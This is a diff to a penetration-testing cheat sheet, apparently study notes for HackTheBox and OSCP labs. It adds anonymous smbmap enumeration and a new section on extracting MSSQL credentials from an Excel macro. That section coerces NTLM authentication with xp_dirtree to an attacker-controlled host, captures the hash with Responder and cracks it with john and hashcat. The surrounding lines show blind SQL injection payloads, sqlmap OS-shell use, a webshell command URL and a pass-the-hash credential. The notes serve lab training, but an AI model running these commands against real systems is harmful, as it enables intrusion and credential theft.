@@ -918,6 +918,8 @@ mget *     # Every time need to click yes, yes ..
 
 #SMBmap
 smbmap -H <target_ip>
+smbmap -H <target_ip>5 -u anonymous -d localhost
+smbmap -H <target_ip>   -u anonymous -d HTB.LOCAL
 smbmap -u L4mpje -p aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 -H 10.10.10.134 # Ippsec's HTB Bastion
 smbmap -H <target_ip> -u <username> -p <password>
 smbmap -H <target_ip> -u <username> -p <password> -d <domain>
@@ -1391,7 +1393,7 @@ admin' or '1'='1
 http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 ```
 
-- Manual Code Execution
+### Manual Code Execution sql
 
 ```powershell
 kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
@@ -1421,7 +1423,7 @@ netexec mssql 10.10.125.148 -u sql_svc -p Dolphin1 -q 'EXEC xp_cmdshell "whoami"
 http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
 ```
 
-- SQLMap - Automated Code execution
+### SQLMap - Automated Code execution
 
 ```powershell
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
@@ -1430,6 +1432,24 @@ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping data
 #OS Shell
 #  Obtain the Post request from Burp suite and save it to post.txt
 sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www/html/tmp is the writable folder on target, hence we're writing there
+
+```
+
+### MSSQL creds from .xlsm file MS Excel macro 
+- I had a situation, where smb, mssql ports open, not creds to login with SQL, so dig into smb found that .xlsm so it is microsoft execl macro.
+- To open that file we need a oletools
+- Reference HTB - Querier, another [article](https://medium.com/@PenSunset/querier-hackthebox-walkthrough-c6baf9df0d14)
+```powershell
+#install oletools, Already their a pyhton virtual environment in my machine at (source /home/kali/HTB/HTB/Chaos/myenv/bin/activate).
+pip install -U oletools
+olevba Currency\ Volume\ Report.xlsm
+impacket-mssqlclient reporting@10.10.10.125 -windows-auth #PAssword-PcwTWTHRwryjc$c6
+#From this shell <b> don't have the xp_cmdshell</b>, try to Steal NetNTLM hash / Relay attack using xp_dirtree command tries to ping the smb of kali machine, 
+exec xp_dirtree "\\10.10.14.12\ashok\"
+sudo responder -I tun0 # this will catch the NTLM hash, this case got mssql-svc user save the hash in text file crack with either john or hashcat tool.
+john hash -w=/home/kali/HTB/OSCP/rockyou.txt  
+#with hashcat
+Hashcat -m 5600 hash /home/kali/HTB/OSCP/rockyou.txt  
 
 ```
 
@@ -2377,7 +2397,8 @@ john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
 - If the user has privileges DnsAdmin similar machine in HacktheBox Resolute [Resolute](https://app.hackthebox.com/machines/220/information)
 ```powershell
 smbclient -L 10.10.10.169 
-smbclient -L //10.10.10.169
+smbclient -L //10.10.10.169/
+smbclient -N -L //10.10.10.125/   
 smbmap -H 10.10.10.169
 nbtscan 10.10.10.169
 nmblookup -A 10.10.10.169
